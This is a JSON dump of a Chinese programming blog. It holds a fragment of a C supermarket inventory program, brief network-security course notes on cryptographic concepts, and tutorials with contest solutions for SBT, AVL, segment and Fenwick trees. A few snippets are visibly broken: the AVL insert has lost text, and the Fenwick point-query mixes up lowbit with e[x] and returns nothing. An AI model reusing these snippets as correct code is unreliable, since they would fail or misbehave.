*L;//寻找p商品之前的那个结点 while(now-&gt;next != p) now = now-&gt;next; now-&gt;next = p-&gt;next; free(p); &#125; CurrentCnt--; printf(\"已删除\\n\\n\"); &#125;else printf(\"已取消\\n\\n\"); return;&#125;void menu_print()&#123; printf(\"商品的链表文件已建立，有%d个商品记录\\n\", CurrentCnt); printf(\"****************************************\\n\"); printf(\"1.显示所有商品的信息：\\n\"); printf(\"2.修改某个商品的信息：\\n\"); printf(\"3.插入某个商品的信息：\\n\"); printf(\"4.删除某个商品的信息：\\n\"); printf(\"5.查找某个商品的信息：\\n\"); printf(\"6.商品存盘并退出系统：\\n\"); printf(\"7.对商品价格进行排序：\\n\"); printf(\"8.(慎用)删除所有内容：\\n\"); printf(\"其他，不存盘并退出系统：\\n\"); printf(\"****************************************\\n\"); printf(\"输入您的选择：\");&#125;void good_swap(GoodList* a,GoodList* b)&#123;//交换两个商品的位置 GoodList a_ = *a, b_ = *b; *a = b_; *b = a_; a-&gt;next = a_.next; b-&gt;next = b_.next; return;&#125;void bubble_sort(GoodList **L)&#123; printf(\"正在冒泡排序...\\n\"); for(int i=1;i&lt;=CurrentCnt-1;i++)&#123; GoodList* now = *L; while(now-&gt;next != NULL)&#123; if(now-&gt;data.good_price &gt; now-&gt;next-&gt;data.good_price) good_swap(now, now-&gt;next); now = now-&gt;next; &#125; &#125; printf(\"排序完成！\\n\"); OutputAll(*L);&#125;int main()&#123; char str[MAX_ID_LEN]; int CHOICE; GoodList *Head,*p; Head=NULL; info_init(&amp;Head);//读取文件 do&#123; printf(\"超市商品管理系统\\n\"); CHOICE=0; menu_print();//菜单 scanf(\"%d\",&amp;CHOICE);//输入选择 switch(CHOICE)&#123; case 1:&#123; OutputAll(Head); pause(); break; &#125; case 2:&#123; int ok=0; do&#123; printf(\"请输入需要修改的商品ID（输入-1退出）:\"); scanf(\"%s\",str); if(strcmp(str,\"-1\") == 0) break; p = good_find(Head, str); if(p == NULL) printf(\"\\n对不起，没有找到该商品，请重新输入:\\n\"); else Goodprint(p),ok=1; &#125;while(!p); if(ok)&#123; info_change(p); printf(\"\\n修改成功!\\n\\n\"); &#125; pause(); break; &#125; case 3:&#123; info_insert(&amp;Head); pause(); break; &#125; case 4:&#123; info_dele(&amp;Head); pause(); break; &#125; case 5:&#123; printf(\"请输入需要查询的商品ID:\"); scanf(\"%s\",str); p = good_find(Head, str); if(p == NULL) printf(\"\\n对不起，没有找到该商品\\n\\n\"); else Goodprint(p); pause(); break; &#125; case 6:&#123; char str[MAX_ID_LEN]; printf(\"确定要保存吗？（Y/N）：\"); scanf(\"%s\",str); if(strcmp(str, \"Y\") == 0||strcmp(str, \"y\") == 0)&#123; info_flush(&amp;Head); printf(\"保存成功，即将退出系统\\n\"); CHOICE=0;//退出信号 &#125;else&#123; printf(\"已取消\\n\"); pause(); &#125; break; &#125; case 7:&#123; bubble_sort(&amp;Head); pause(); break; &#125; case 8:&#123; DelAll(&amp;Head); pause(); break; &#125; default:&#123; CHOICE=0;//退出信号 printf(\"\\n即将不存盘并退出系统\\n\\n\\n\\n\"); &#125; &#125; &#125;while(CHOICE); system(\"pause\"); return 0;&#125;","categories":[{"name":"project","slug":"project","permalink":"https://mrh1s.top/categories/project/"}],"tags":[]},{"title":"网络安全课笔记 of Shijie Zhou #2","slug":"e7-bd-91-e7-bb-9c-e5-ae-89-e5-85-a8-e8-af-be-e7-ac-94-e8-ae-b0-of-shijie-zhou-2","date":"2018-12-13T13:42:46.000Z","updated":"2019-05-05T05:44:42.783Z","comments":true,"path":"posts/ef5c41ea/","link":"","permalink":"https://mrh1s.top/posts/ef5c41ea/","excerpt":"","text":"密码学的应用安全多方计算： ​ y=f( x1 , x2 , … , xn) 在不告诉其他人自己的输入内容的情况下计算出结果的方法 ​ 目前无解，难题 ​ 但有特例：两方安全计算问题 ​ 百万富翁难题，n1，n2如何在双方不知道对方数值的情况下比较这两个数的大小关系 ​ 解决方法：1.基于RSA的方案 2.可信第三方（P2P对等网络/BlockChain） 密钥交换： ​ 基础：数学难题（安全性基于假设，没有严格的数学证明，归约的思想） ​ DH密钥交换 ​ y=(g^x)mod n 很容易， 但反函数很困难（离散对数问题） k=g^(x+y) ​ 但容易遭受中间人攻击 安全协议： 语法、语义、规则 ​ 自然语言理解（AI） 一次性口令认证： ​ 1.直接存放明文 ​ 2.哈希加密（随机数加盐） ​ 3.算n次哈希（害怕中间人攻击，直接把第一次哈希值得到） 可靠性问题：拜占庭将军问题 匿名通信：抛币协议，密码员就餐问题","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[]},{"title":"迁移完成！","slug":"e8-bf-81-e7-a7-bb-e5-ae-8c-e6-88-90-ef-bc-81","date":"2018-12-06T15:49:34.000Z","updated":"2019-05-04T15:39:44.412Z","comments":true,"path":"posts/89193a03/","link":"","permalink":"https://mrh1s.top/posts/89193a03/","excerpt":"","text":"两年的竞赛生涯，汇聚为22篇题解，以纪念我的NOIP之路。","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"SBT总结","slug":"sbt-e6-80-bb-e7-bb-93","date":"2018-12-06T15:47:22.000Z","updated":"2019-05-05T05:38:28.506Z","comments":true,"path":"posts/68e69317/","link":"","permalink":"https://mrh1s.top/posts/68e69317/","excerpt":"","text":"SBT节点大小平衡树总结 SBT是二叉查找树的优化。 与二叉平衡树AVL类似，我们定义一棵树： 这棵树的size为这棵树所有节点的个数 每棵子树的大小不小于其兄弟的子树大小 即s[right[t]]≥s[left[left[t]]],s[right[left[t]]] 且 s[left[t]]≥s[right[right[t]]], s[left[right[t]]] 如果插入结点后不满足SBT性质，那么递归修复这棵树的性质，通过旋转达到目的。 voidRight_Rotate(int &amp;t){ int k=left[t]; left[t]=right[k]; right[k]=t; s[k]=s[t]; s[t]=s[left[t]]+s[right[k]]+1; t=k; return; } voidLeft_Rotate(int &amp;t){ int k=right[t]; right[t]=left[k]; left[k]=t; s[k]=s[t]; s[t]=s[left[k]]+s[right[t]]+1; t=k; return; } 这里可以运用小技巧，在传入变量的时候传入指针，修改变量的同时也修改了原来根节点的值 怎么判断旋转的方式？用Maintain函数，形参为根节点与变量flag，false表示当前考虑的是左边的结点 true是右边的结点。其中我们应该判断四个子节点和根节点是否需要修复，但是“左右”，“右左”的情况被证明已经被根节点的修复操作所判断，又少了两个操作 voidMaintain(int &amp;t,bool flag){ if(flag==false){ if(s[left[left[t]]]&gt;s[right[t]]) Right_Rotate(t); elseif(s[right[left[t]]]&gt;s[right[t]]){ Left_Rotate(left[t]); Right_Rotate(t); }else return;//一定记住返回 }else{ if(s[right[right[t]]]&gt;s[left[t]]) Left_Rotate(t); else if(s[left[right[t]]]&gt;s[left[t]]){ Right_Rotate(right[t]); Left_Rotate(t); }else return;//一定记住返回 } Maintain(left[t],false); Maintain(right[t],true); Maintain(t,false); Maintain(t,true); } 插入操作：插入元素后修复整棵树 voidInsert(int &amp;t,int k){ if(t==0){//新结点 key[++cnt]=k; s[cnt]=1; t=cnt; left[cnt]=right[cnt]=0; } else{ s[t]++; if(k&lt;key[t]) Insert(left[t],k); else Insert(right[t],k); Maintain(t,k&gt;=key[t]); } } 找前驱： intPred(int rt,int k){//找前驱 if(rt==0) return k; if(k&lt;key[rt]) return Pred(left[rt],k);//如果仍然不是前驱，就继续往前找 else return Pred(right[rt],k); } 找后继： intSucc(int rt,int k){//找后继 if(rt==0) return k; if(k&gt;key[rt]) returnSucc(right[rt],k); else return Succ(left[rt],k) } 寻找第K小的数 intselect(int &amp;x,int k)//求第k小数 { int r = tree[tree[x].left].size + 1; if(r == k) return tree[x].key; else if(r &lt; k) return select(tree[x].right,k - r); else return select(tree[x].left,k); } 询问某元素在树中是第几大 intrank(int &amp;x,int key)//求key排第几 { if(key &lt; tree[x].key) return rank(tree[x].left,key); else if(key &gt; tree[x].key) return rank(tree[x].right,key) + tree[tree[x].left].size +1; return tree[tree[x].left].size + 1; }","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"AVL树总结","slug":"avl-e6-a0-91-e6-80-bb-e7-bb-93","date":"2018-12-06T15:46:59.000Z","updated":"2019-05-05T05:06:27.482Z","comments":true,"path":"posts/17525de2/","link":"","permalink":"https://mrh1s.top/posts/17525de2/","excerpt":"","text":"AVL树总结 AVL树是二叉查找树的一种优化，能将链状的二叉查找树几乎平均地储存下来，从而减少搜索使用的时间。 AVL树是空树，或满足以下定义的树： 1、左右子树都是AVL树；（递归定义） 2、左右子树高度之差不超过1； 定义平衡因子： 左子树高度-右子树高度，当平衡因子大于等于2时，我们就称这棵树不平衡，需要通过旋转让它重新平衡。 获取节点高度： int h(int rt){ if(rt==0) return -1;//这里return-1的原因后面阐释 return no[rt].height; } 单旋转 “左左”当根节点的左子树的左儿子与根节点的右儿子不平衡时 我们通过单旋转使平衡树符合该树的性质 int SingeRotateWithLeft(int x){ int y; y=no[x].left; no[x].left=no[y].right; no[y].right=x; no[y].height=max(h(no[y].left),h(no[y].right))+1; no[x].height=max(h(no[x].left),h(no[x].right))+1; return y; } “右右”方法类似，与左左对称 双旋转 “左右”当根节点的左子树的右儿子与根节点的右儿子不平衡时 旋转两次即可使这棵树平衡 int doubleRotateWithLeft(int x){ no[x].left=SingleRotateWithRight(no[x].left); &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; SingleRotateWithLeft(x);} “右左”同理。 插入操作：先正常插入指定结点，再判断原树是否平衡，不平衡要根据具体情况旋转使原树平衡 int insert(int k,int rt){ if(rt==0) rt=newNode(k); else if( k< no[rt].key ){ no[rt].left=insert(k,no[rt].left); if( h(no[rt].left)-h(no[rt].right) )==2 ) if(k no[rt].key){ no[rt].right=insert(k,no[rt].right); if( h(no[rt].right)-h(no[rt].left) )==2 ) if(k > no[ no[rt].right ] .key ) rt=SingleRotateWithRight(rt); else rt= DoubleRotateWithRight(rt) } no[rt].height = max ( h( no[rt].left ), h( no[rt].right ) ) +1; return rt; } int newNode(int k){ no[cnt].height=no[cnt].left=no[cnt].right=0; no[cnt].key=k; return cnt++; } AVL树过于复杂，但却是其他二叉搜索树变形特别是旋转的基础，删除操作实在过于复杂，本人无法理解。。。建议大家使用懒惰标记吧，不在真正意义上删除结点。 说这么多 大家还是转战SBT吧QAQ","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"线段树总结","slug":"e7-ba-bf-e6-ae-b5-e6-a0-91-e6-80-bb-e7-bb-93","date":"2018-12-06T15:46:09.000Z","updated":"2019-05-05T05:32:45.561Z","comments":true,"path":"posts/852a3205/","link":"","permalink":"https://mrh1s.top/posts/852a3205/","excerpt":"","text":"线段树总结 引入：有一个数组data[1000000]，如果有m个操作(m 修改一个数（加或减） 求l到r的所有元素的和 对于通常的题目，用一个sum[i]数组记录1~i的和，即可将任何的区间和在O(1)的时间之内求出。然而对于操作一，显然就显得很耗时间，至少会花费O(n)，由此可以看出这样的做法是有一定缺陷的，由此线段树便产生了。 线段树是一种二叉搜索树，与区间树相似，它将一个区间划分成一些单元区间，每个单元区间对应线段树中的一个叶结点。 我们从1~n的区间开始，依次往下二分加入更小的区间，直到区间长度为1 如图，这里的左闭右开区间类似于闭区间，表示的元素集合基本相同，我们看到，线段树并不是一个完全二叉树，但是十分类似于完全二叉树，由此可以得到线段树的一般存储方式，用完全二叉树进行存储。 操作1中，只能修改一个数，如果要修改线段树的整个区间，要添加n次数，大大增加了线段树的时间。 解决方法：定义一个lazy数组，当我们在遍历过程中，发现需要存储的区间已经包含了当前遍历的区间，我们就可以将需要修改的数值通过lazy暂存在此处，直到下一次我们还需要添加数或者在查找区间和时，再调用lazy，将更深处的sum值更新 这样就得到了添加元素的通用做法，将所有修改点的操作看作修改长度为1的区间，这样大大增加了算法的普适性 更紧凑的存储方式 刚刚提到线段树不完全属于完全二叉树，所以用堆的方式存储会引起内存的浪费，以下方式可以做到对内存的一定节省。 对于节点区间为[l,r)的结点，我们将其地址映射到(l+r-1)|( (r-1)!=1)，其中(r-l)!=1用来判断r与l差值是否为1。可将使用的空间精确无误地映射到[0,2n-2]中 关于开数组的tips： 对于堆的开法，数组大小至少4n 对于紧凑的储存方式，可以适当开2n Hdu 1166 敌兵布阵 Problem Description C国的死对头A国这段时间正在进行军事演习，所以C国间谍头子Derek和他手下Tidy又开始忙乎了。A国在海岸线沿直线布置了N个工兵营地,Derek和Tidy的任务就是要监视这些工兵营地的活动情况。由于采取了某种先进的监测手段，所以每个工兵营地的人数C国都掌握的一清二楚,每个工兵营地的人数都有可能发生变动，可能增加或减少若干人手,但这些都逃不过C国的监视。中央情报局要研究敌人究竟演习什么战术,所以Tidy要随时向Derek汇报某一段连续的工兵营地一共有多少人,例如Derek问:“Tidy,马上汇报第3个营地到第10个营地共有多少人!”Tidy就要马上开始计算这一段的总人数并汇报。但敌兵营地的人数经常变动，而Derek每次询问的段都不一样，所以Tidy不得不每次都一个一个营地的去数，很快就精疲力尽了，Derek对Tidy的计算速度越来越不满:”你个死肥仔，算得这么慢，我炒你鱿鱼!”Tidy想：“你自己来算算看，这可真是一项累人的工作!我恨不得你炒我鱿鱼呢!”无奈之下，Tidy只好打电话向计算机专家Windbreaker求救,Windbreaker说：“死肥仔，叫你平时做多点acm题和看多点算法书，现在尝到苦果了吧!”Tidy说：”我知错了。。。”但Windbreaker已经挂掉电话了。Tidy很苦恼，这么算他真的会崩溃的，聪明的读者，你能写个程序帮他完成这项工作吗？不过如果你的程序效率不够高的话，Tidy还是会受到Derek的责骂的. Input 第一行一个整数T，表示有T组数据。每组数据第一行一个正整数N（N&lt;=50000）,表示敌人有N个工兵营地，接下来有N个正整数,第i个正整数ai代表第i个工兵营地里开始时有ai个人（1&lt;=ai&lt;=50）。接下来每行有一条命令，命令有4种形式：(1) Add i j,i和j为正整数,表示第i个营地增加j个人（j不超过30）(2)Sub i j ,i和j为正整数,表示第i个营地减少j个人（j不超过30）;(3)Query i j ,i和j为正整数,i&lt;=j，表示询问第i到第j个营地的总人数;(4)End 表示结束，这条命令在每组数据最后出现;每组数据最多有40000条命令 Output 对第i组数据,首先输出“Case i:”和回车,对于每个Query询问，输出一个整数并回车,表示询问的段中的总人数,这个数保持在int以内。 Sample Input 1 10 12 3 4 5 6 7 8 9 10 Query1 3 Add3 6 Query2 7 Sub10 2 Add6 3 Query3 10 End Sample Output Case1: 6 33 59 #include&lt;cstdio&gt;#define MAX 1000020#define lson l,m,rt&lt;&lt;1 //左儿子 #define rson m+1,r,rt&lt;&lt;1|1 //右儿子 //闭区间线段树 int sum[MAX];char str[10];void PushUP(int rt) &#123; sum[rt]=sum[rt&lt;&lt;1]+sum[rt&lt;&lt;1|1];&#125;void Revise(int p,int data,int l,int r,int rt)&#123; if(l==r)&#123;//区间长度为1 sum[rt]+=data; return; &#125; int m=(l+r)&gt;&gt;1;//取中点 if(p&lt;=m) Revise(p,data,lson);//向左递归线段树 else Revise(p,data,rson);//向右递归线段树 PushUP(rt);//更新根节点的sum &#125;int Query(int L,int R,int l,int r,int rt)&#123;//[L,R]为查找的区间 ，[l,r]为当前遍历的区间 if(L&lt;=l&amp;&amp;R&gt;=r) //查找的区间包含遍历的区间 return sum[rt]; int m=(l+r)&gt;&gt;1,tot=0; if(L&lt;=m) tot+=Query(L,R,lson); if(R&gt;m) tot+=Query(L,R,rson); return tot;&#125;void build(int l,int r,int rt) &#123; if (l==r)&#123; scanf(\"%d\",&amp;sum[rt]); return; &#125; int m=(l+r)&gt;&gt;1; build(lson); build(rson); PushUP(rt);//更新根节点的sum &#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int t,n,a,b; scanf(\"%d\",&amp;t); for(int i=1;i&lt;=t;i++)&#123; scanf(\"%d\",&amp;n);/* for(int j=1;j&lt;=n;j++)&#123; scanf(\"%d\",&amp;a); Revise(j,a,1,n,1); &#125;*/ build(1,n,1); printf(\"Case %d:\\n\",i); while(scanf(\"%s\",str)!=EOF&amp;&amp;str[0]!='E')&#123; scanf(\"%d%d\",&amp;a,&amp;b); if(str[0]=='A') Revise(a,b,1,n,1); else if(str[0]=='S') Revise(a,-b,1,n,1); else printf(\"%d\\n\",Query(a,b,1,n,1)); &#125; &#125; return 0;&#125; hdu 1754 I Hate It Problem Description 很多学校流行一种比较的习惯。老师们很喜欢询问，从某某到某某当中，分数最高的是多少。 这让很多学生很反感。 不管你喜不喜欢，现在需要你做的是，就是按照老师的要求，写一个程序，模拟老师的询问。当然，老师有时候需要更新某位同学的成绩。 Input 本题目包含多组测试，请处理到文件结束。 在每个测试的第一行，有两个正整数 N 和 M ( 0&lt;N&lt;=200000,0&lt;M&lt;5000 )，分别代表学生的数目和操作的数目。 学生ID编号分别从1编到N。 第二行包含N个整数，代表这N个学生的初始成绩，其中第i个数代表ID为i的学生的成绩。 接下来有M行。每一行有一个字符 C (只取’Q’或’U’) ，和两个正整数A，B。 当C为’Q’的时候，表示这是一条询问操作，它询问ID从A到B(包括A,B)的学生当中，成绩最高的是多少。 当C为’U’的时候，表示这是一条更新操作，要求把ID为A的学生的成绩更改为B。 Output 对于每一次询问操作，在一行里面输出最高成绩。 Sample Input 5 6 1 2 3 4 5 Q 1 5 U 3 6 Q 3 4 Q 4 5 U 2 9 Q 1 5 Sample Output 5 6 5 9 Hint Huge input,the C function scanf() will workbetter than cin 线段树稍微变了一点点型，在更新每个结点的时候取最大值而不取和 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define lson l,m,rt&lt;&lt;1#define rson m+1,r,rt&lt;&lt;1|1using namespace std;const int MAX=1000000;int sum[MAX];void PushUP(int rt)&#123; sum[rt]=max(sum[rt&lt;&lt;1],sum[rt&lt;&lt;1|1]);&#125;void Build(int l,int r,int rt)&#123; if(l==r)&#123; scanf(\"%d\",&amp;sum[rt]); return; &#125; int m=(l+r)&gt;&gt;1; Build(lson); Build(rson); PushUP(rt);&#125;int Query(int L,int R,int l,int r,int rt)&#123; if(L&lt;=l&amp;&amp;R&gt;=r) return sum[rt]; int m=(l+r)&gt;&gt;1,maxx=-1; if(L&lt;=m) maxx=max(maxx,Query(L,R,lson)); if(R&gt;=m+1) maxx=max(maxx,Query(L,R,rson)); return maxx;&#125;void Revise(int p,int data,int l,int r,int rt)&#123; if(l==r)&#123; sum[rt]=data; return; &#125; int m=(l+r)&gt;&gt;1; if(p&lt;=m) Revise(p,data,lson); else Revise(p,data,rson); PushUP(rt);&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,a,b; char c; while(scanf(\"%d%d\",&amp;n,&amp;m)!=EOF)&#123; memset(sum,0,sizeof(sum)); Build(1,n,1); for(int i=1;i&lt;=m;i++)&#123; getchar(); c=getchar(); scanf(\"%d%d\",&amp;a,&amp;b); if(c=='U') Revise(a,b,1,n,1); else printf(\"%d\\n\",Query(a,b,1,n,1)); &#125; &#125;&#125; poj 2299 题意： 求逆序对 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define lson l,m,rt&lt;&lt;1#define rson m+1,r,rt&lt;&lt;1|1#define MAX 500020using namespace std;int data[MAX],t[MAX],sum[MAX&lt;&lt;2];bool flag[MAX];void PushUP(int rt)&#123; sum[rt]=sum[rt&lt;&lt;1]+sum[rt&lt;&lt;1|1];&#125;int Find(int s,int e,int aim)&#123; while(s&lt;=e)&#123; int mid=(s+e)&gt;&gt;1; if(t[mid]==aim)&#123; while(t[mid-1]==t[mid])&#123; flag[mid]=-1; mid--; &#125; return mid; &#125; else if(t[mid]&gt;aim) e=mid-1; else s=mid+1; &#125;&#125;void Revise(int p,int l,int r,int rt)&#123; if(l==r)&#123; sum[rt]+=1; return; &#125; int m=(l+r)&gt;&gt;1; if(p&lt;=m) Revise(p,lson); else Revise(p,rson); PushUP(rt);&#125;long long View(int L,int R,int l,int r,int rt)&#123; if(L&lt;=l&amp;&amp;R&gt;=r) return sum[rt]; int m=(l+r)&gt;&gt;1; long long tot=0; if(L&lt;=m) tot+=View(L,R,lson); if(R&gt;=m+1) tot+=View(L,R,rson); return tot;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n; long long ans; while(scanf(\"%d\",&amp;n)&amp;&amp;n)&#123; memset(sum,0,sizeof(sum)); ans=0; for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d\",&amp;data[i]); t[i]=data[i]; &#125; sort(t+1,t+1+n); for(int i=1;i&lt;=n;i++)&#123; int f=Find(1,n,data[i]); ans+=View(f+1,n,1,n,1); Revise(f,1,n,1); &#125; printf(\"%lld\\n\",ans); &#125; return 0;&#125; POJ3468 Description You have N integers, A1, A2, … , AN. Youneed to deal with two kinds of operations. One type of operation is to add somegiven number to each number in a given interval. The other is to ask for thesum of numbers in a given interval. Input The first line contains two numbers N andQ. 1 ≤ N,Q ≤ 100000. The second line contains N numbers, theinitial values of A1, A2, … , AN. -1000000000 ≤ Ai ≤ 1000000000. Each of the next Q lines represents anoperation. “C a b c” means adding c to eachof Aa, Aa+1, … , Ab. -10000 ≤ c ≤ 10000. “Q a b” means querying the sum ofAa, Aa+1, … , Ab. Output You need to answer all Q commands in order.One answer in a line. Sample Input 10 5 1 2 3 4 5 6 7 8 9 10 Q 4 4 Q 1 10 Q 2 4 C 3 6 3 Q 2 4 Sample Output 4 55 9 15 题意： 给你N个数，Q个操作，操作有两种，‘Q a b ’是询问ab这段数的和，‘Ca b c’是把ab这段数都加上c。 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define lson l,m,rt&lt;&lt;1#define rson m+1,r,rt&lt;&lt;1|1using namespace std;const int MAX=100020;long long data[MAX],sum[MAX&lt;&lt;2],lazy[MAX&lt;&lt;2];void PushUp(int rt)&#123; sum[rt]=sum[rt&lt;&lt;1]+sum[rt&lt;&lt;1|1];&#125;void PushDown(int rt,int m)&#123; if(lazy[rt])&#123;//如果lazy存在 lazy[rt&lt;&lt;1]+=lazy[rt];//加lazy值 lazy[rt&lt;&lt;1|1]+=lazy[rt]; sum[rt&lt;&lt;1]+=(m-(m&gt;&gt;1))*lazy[rt];//左儿子所包含的数 sum[rt&lt;&lt;1|1]+=(m&gt;&gt;1)*lazy[rt];//右儿子所包含的数 lazy[rt]=0; &#125;&#125;void Build(int l,int r,int rt)&#123; if(l==r)&#123; scanf(\"%lld\",&amp;sum[rt]); return; &#125; int m=(l+r)&gt;&gt;1; Build(lson); Build(rson); PushUp(rt);&#125;void Revise(int L,int R,int data,int l,int r,int rt)&#123; if(l&gt;=L&amp;&amp;r&lt;=R)&#123; lazy[rt]+=data; sum[rt]+=data*(r-l+1); return; &#125; PushDown(rt,r-l+1); int m=(l+r)&gt;&gt;1; if(L&lt;=m) Revise(L,R,data,lson); if(R&gt;=m+1) Revise(L,R,data,rson); PushUp(rt);&#125;long long View(int L,int R,int l,int r,int rt)&#123; if(l&gt;=L&amp;&amp;r&lt;=R) return sum[rt]; PushDown(rt,r-l+1); int m=(l+r)&gt;&gt;1; long long tot=0; if(L&lt;=m) tot+=View(L,R,lson); if(R&gt;m) tot+=View(L,R,rson); return tot; &#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,q,a,b,c; scanf(\"%d%d\",&amp;n,&amp;q); Build(1,n,1); for(int i=1;i&lt;=q;i++)&#123; getchar(); if(getchar()=='C')&#123; scanf(\"%d%d%d\",&amp;a,&amp;b,&amp;c); Revise(a,b,c,1,n,1); &#125;else&#123; scanf(\"%d%d\",&amp;a,&amp;b); printf(\"%lld\\n\",View(a,b,1,n,1)); &#125; &#125; return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"树状数组总结","slug":"e6-a0-91-e7-8a-b6-e6-95-b0-e7-bb-84-e6-80-bb-e7-bb-93","date":"2018-12-06T15:46:00.000Z","updated":"2019-05-05T06:21:55.782Z","comments":true,"path":"posts/30ce1405/","link":"","permalink":"https://mrh1s.top/posts/30ce1405/","excerpt":"","text":"树状数组总结树状数组是一个类似于线段树的树状结构，它通过存储一定区间内的元素来达到快速插入、快速求和的效果。并且可以节省时间，节省空间，减少代码量，可谓是非常优秀的一个树形结构 方格中数字代表对应数组的第几个元素,下排是a数组,其上方的是e数组,最下的二进制则是对应编号的二进制表示. 可以观察到，树状数组把一个数组内的元素进行了一定的二分，并存储某些元素的和，使树的深度达到了logn，这样不论是对于查找还是插入都进行了极大的优化 每个数所指向的元素个数为1+它的二进制末尾0的个数我们把二进制中最后一个一出现的位置叫做lowbit，每个元素指向的下一个元素为x+lowbit(x)，现在要修改整棵树就比较容易了。 累加操作 void add(int x,int t) &#123; while(x&lt;=n)&#123; e[x]+=t; x=x+lowbit(x); &#125; &#125; 求和操作 int sum(int x) &#123; int s=0; while(x&gt;0) &#123; s+=e[x]; x-=lowbit(x); &#125; return s; &#125; 其中，求和操作求的是1x个元素之和，要求ab个元素之和，只需： Ans=sum(b)-sum(a-1); 其中运用了两次查询，对于查询单个元素，还可以优化为一次： 借助data[x]=e[x]-(query(x-1)-query(LCA(x,x-1))) int sum(x)&#123; int ans=e[x]; int lca=x-lowbit(x);//求最近公共祖先 x--; while(x!=lca)&#123; ans-=e[x]; x-=e[x]; &#125;&#125; 拓展操作： 区间修改、点查询 令e[i]为i元素与i-1元素的差值 那么区间[i,j]修改： e[i]+=d; e[j+1]-=d; 单个点的求值：data[i]=e[1]+e[2]+…+e[i]; 找第k小的元素 e[i]数组存取i出现的次数（有时数据太大可以离散优化） 问题可以转化为求区间和为k所对应的下标 区间和为递增区间，用二分查找 如4 6 5 5 2 2 3 1，每个数作为下标，add一次 然后sum(i)求出的就是当前1~i区间的数字个数，并且数字有序，二分即可 向高维拓展 树状数组与线段树相比，还是比较方便向高维拓展的，只需加一重循环即可 void Change(int x,int y,int data)&#123; While(x&lt;=n)&#123; int ty=y; While(ty&lt;=n)&#123; e[x][ty]+=delta; ty+=lowbit(y); &#125; x+=lowbit(x); &#125;&#125; 树状数组 Ultra-QuickSort 题目（poj 2299） 请分析，对于一串数列，各个数字不相同，至少要交换多少次才能使该数列有序（从小到大）？ 输入： 输入包含多组测试样例，每组测试样例都是先输入一个整数n&lt;500000——序列的长度，以下n行每行包括一个整数 0 ≤ a[i]≤ 999,999,999,已输入的n为0作为输入的终止条件。 输出： 对于每一组样例，输出一个整数，表示至少要交换的次数。 输入样例： 5 9 1 0 5 4 3 1 2 3 0 输出样例： 6 0 很标准的一道题，先将所有元素取出排序，去重，作为离散优化二分的依据 依次从第一位开始向树状数组对应位置加值，add(find(x),1)，并且同时算出当前比该元素大的值有多少，更新答案 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define MAX 500020using namespace std;int n,m,p,t[MAX],data[MAX];long long e[MAX],s,ans;int lowbit(int i)&#123; return -i&amp;i;&#125;void add(int x,int p)&#123; for(;x&lt;=n;x+=lowbit(x)) e[x]+=p;&#125;long long sum(int x)&#123; for(s=0;x&gt;0;x-=lowbit(x)) s+=e[x]; return s;&#125;int Find(int s,int e,int aim)&#123; while(s&lt;=e)&#123; int m=(s+e)&gt;&gt;1; if(t[m]==aim) return m; if(t[m]&gt;aim) e=m-1; else s=m+1; &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); while(~scanf(\"%d\",&amp;n)&amp;&amp;n)&#123; memset(e,0,sizeof(e)); ans=0; for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d\",&amp;data[i]); t[i]=data[i]; &#125; sort(t+1,t+n+1); m=unique(t+1,t+n)-t; for(int i=1;i&lt;=n;i++)&#123; int f=Find(1,m,data[i]);//找离散优化对应元素 ans+=sum(n)-sum(f);//每次看比此数大的数有几个 add(f,1);//将此数加入 &#125; printf(\"%lld\\n\",ans); &#125; return 0;&#125; Poj3928 Ping Pong 题意： n（3 &lt; = 20000）乒乓球运动员住在一个西大街（考虑街道作为一个线段）。每个球员都有一个独特的技能等级。为了提高他们的技能等级，他们经常互相竞争。如果两个球员想参加比赛，他们必须选择其他乒乓球运动员的裁判，并在裁判的房子举行比赛。因为某些原因，参赛者不能选择一个技能等级较高或低于他们两个级别的裁判。参赛者必须走到裁判的房子，因为他们是懒惰的，他们想使他们的总步行距离不超过他们的房子之间的距离。当然，所有的球员都住在不同的房子，他们的房子的位置都是不同的。如果裁判或任何两名选手是不同的，我们称之为两个不同的游戏。现在的问题是：有多少不同的游戏可以在这个乒乓街举行？ 输入 The first lineof the input contains an integer T(1&lt;=T&lt;=20), indicating the number oftest cases, followed by T lines each of which describes a test case. 输入的第一行包含一个整数t（1 &lt; =T &lt; = 20），表示测试用例的数量，然后是T行，其中每一个描述了一个测试用例。 Every testcase consists of N + 1 integers. The first integer is N, the number of players.Then N distinct integers a1, a2 … aN follow, indicating the skill rank ofeach player, in the order of west to east. (1 &lt;= ai &lt;= 100000, i = 1 …N). 每一个测试用例都是由n个1个整数组成的。第一个整数是n，玩家的数量。然后，n个不同的整数A1、A2…一个跟随，指示每个玩家的技能等级，在西到东的顺序。（1 &lt; = 100000，I = 1…n）。 Output 输出 For each testcase, output a single line contains an integer, the total number of differentgames. 对于每一个测试用例，输出一个单行包含一个整数，不同游戏的总数。 先把所有选手的能力值排序，然后加入能力值最低的选手，然后枚举所有可能成为裁判的选手，同时计算出这个裁判的左边和右边比裁判能力值大和小的值，ans+=(lmin*rmax+lmax*rmin); 